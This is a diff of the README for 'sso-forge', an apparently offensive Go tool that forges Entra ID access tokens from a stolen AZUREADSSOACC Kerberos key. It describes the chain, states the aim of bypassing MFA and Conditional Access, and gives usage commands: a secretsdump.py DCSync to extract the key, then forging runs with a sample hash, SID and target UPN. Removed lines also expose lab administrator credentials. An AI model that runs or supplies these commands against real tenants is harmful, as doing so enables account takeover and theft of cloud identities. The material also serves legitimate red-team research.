@@ -1,26 +1,85 @@
-# azureadsssoacc → sso-forge
+# sso-forge
 
-Cloud token forgery via AZUREADSSOACC Kerberos key extraction.
+Forge Entra ID Seamless SSO access tokens from the AZUREADSSOACC Kerberos key.
+Cross-platform (Linux/macOS/Windows) Go port of AADInternals.
 
-## What
+## How it works
 
-Extract the AZUREADSSOACC computer account's AES256/RC4 key via DCSync → forge Kerberos
-service ticket → WS-Trust exchange at `autologon.microsoftazuread-sso.com` → Entra ID
-access token for ANY synced user. Bypass MFA + Conditional Access.
+```
+DCSync → AZUREADSSOACC key → forged Kerberos ticket → WS-Trust → SAML → OAuth2 → Entra ID access token
+```
 
-## Why
+1. Extract the AZUREADSSOACC computer account's RC4/AES256 key via DCSync (secretsdump.py)
+2. Forge a Kerberos service ticket for `HTTP/autologon.microsoftazuread-sso.com`
+3. Exchange via WS-Trust for a DesktopSsoToken (SAML assertion)
+4. Exchange the SAML assertion for an OAuth2 access token
 
-Domain Admin on-prem doesn't give you cloud access. Reset user passwords doesn't
-bypass MFA. This converts DA → Entra ID token without touching the user.
+## Usage
 
-## Feasibility
+```bash
+# Extract key via Impacket
+secretsdump.py DOMAIN/Administrator@DC -just-dc-user 'AZUREADSSOACC$'
 
-**HIGH.** AADInternals proves full chain works end-to-end. WS-Trust endpoint
-still active (Microsoft docs updated June 2026). No cross-platform port exists.
+# Forge token (RC4)
+./sso-forge \
+  --hash 61bb7f03790448210063f5fe4cf1ca50 \
+  --sid S-1-5-21-2653903403-2779602846-1005841238-1110 \
+  --domain corp.contoso.com \
+  --realm CORP.CONTOSO.COM \
+  --upn user@corp.contoso.com \
+  --output token
 
-## Status
+# AES256 key (auto-detected from key length)
+./sso-forge \
+  --hash <64-char AES256 hex key> \
+  --sid S-1-5-21-... \
+  --domain corp.contoso.com \
+  --realm CORP.CONTOSO.COM \
+  --upn user@corp.contoso.com
 
-Planning complete. Go implementation in progress.
+# secretsdump output format (auto-parsed)
+./sso-forge \
+  --hash 'DOMAIN\AZUREADSSOACC$:aad_...:<NT_HASH>:<NT_HASH>:::' \
+  --sid S-1-5-21-... \
+  --domain corp.contoso.com \
+  --realm CORP.CONTOSO.COM
+```
+
+## Output formats
+
+| Flag | Output |
+|------|--------|
+| `--output token` | Raw JWT access token (default) |
+| `--output json` | JSON with access_token, refresh_token, claims metadata |
+| `--output saml` | SAML 1.1 assertion XML |
+| `--output ssotoken` | DesktopSsoToken (raw WS-Trust response) |
+
+## Flags
+
+| Flag | Description |
+|------|-------------|
+| `--hash` | AZUREADSSOACC key (hex 32-char RC4, 64-char AES256, or secretsdump line) |
+| `--sid` | Target user SID (e.g., S-1-5-21-X-Y-Z-RID) |
+| `--domain` | Public UPN domain suffix (e.g., contoso.com) |
+| `--realm` | On-prem AD FQDN in uppercase (e.g., CORP.CONTOSO.COM) |
+| `--upn` | Target user UPN |
+| `--ticket` | Pre-generated base64 SPNEGO ticket (skips forge) |
+| `--resource` | Target resource URL (default: https://graph.windows.net) |
+| `--tenant-id` | Entra ID tenant ID (auto-discovered if empty) |
+| `--dry-run` | Forge ticket only, skip cloud exchange |
+| `-v` | Verbose output |
+
+## Build
+
+```bash
+go build -o sso-forge .
+```
+
+## Requirements
+
+- AZUREADSSOACC key (RC4 or AES256) — extracted via DCSync (secretsdump.py, Mimikatz, etc.)
+- Target user SID and UPN
+- Domain must have Seamless SSO enabled (Azure AD Connect synced)
 
 ## Architecture
 
@@ -28,59 +87,12 @@ Planning complete. Go implementation in progress.
 sso-forge/
 ├── main.go                   # CLI entry point
 ├── internal/
-│   ├── pac/                  # PAC construction (LOGON_INFO, checksums)
-│   ├── ticket/               # EncTicketPart + Authenticator assembly
+│   ├── pac/                  # PAC construction (KERB_VALIDATION_INFO, checksums)
+│   ├── ticket/               # EncTicketPart + Authenticator DER assembly, encryption
 │   ├── exchange/             # WS-Trust → SAML → OAuth2 pipeline
-│   ├── parse/                # supplementalCredentials blob parser
-│   └── discovery/            # Tenant ID, realm resolution
-├── docs/
-│   ├── adr/                  # Architecture Decision Records
-│   └── milestones.md          # Development milestones
-├── go.mod
-├── Makefile
-└── README.md
+│   ├── parse/                # supplementalCredentials blob + hash input parsing
+│   └── discovery/            # Tenant ID auto-discovery via OpenID config
 ```
-
-## v1 Scope (2 weeks)
-
-- Parse supplementalCredentials blob → RC4/AES keys
-- Kerberos service ticket forgery (PAC + EncTicketPart) — RC4 first, AES in v1.1
-- WS-Trust SOAP exchange → DesktopSsoToken
-- SAML assertion → OAuth2 token exchange
-- Single static binary (Go, cross-compiled)
-
-### Dependencies
-
-- [gokrb5 v8](https://github.com/jcmturner/gokrb5) — Kerberos crypto + types (Apache-2.0)
-- Go stdlib: `net/http`, `encoding/xml`, `encoding/binary`, `crypto/*`
-
-### Explicitly NOT in v1
-
-- DCSync (use secretsdump.py for key extraction)
-- AES256 ticket encryption (RC4 only, AES in v1.1)
-- Multi-user / multi-forest
-- Token caching / persistence
-
-## Usage (planned)
-
-```bash
-# Extract key via Impacket
-secretsdump.py DOMAIN/Administrator@DC -just-dc-user AZUREADSSOACC$
-
-# Forge token
-sso-forge \
-  --hash <NT_HASH> \
-  --sid S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-XXXX \
-  --domain corp.contoso.com \
-  --resource https://graph.microsoft.com
-
-# Output: valid Entra ID access token
-```
-
-## Lab Reference
-
-DetectionLab DC at 192.168.50.227 (WINDOMAIN/Administrator:vagrant)
-Seamless SSO endpoint needs testing against a real Entra ID tenant.
 
 ## References
 
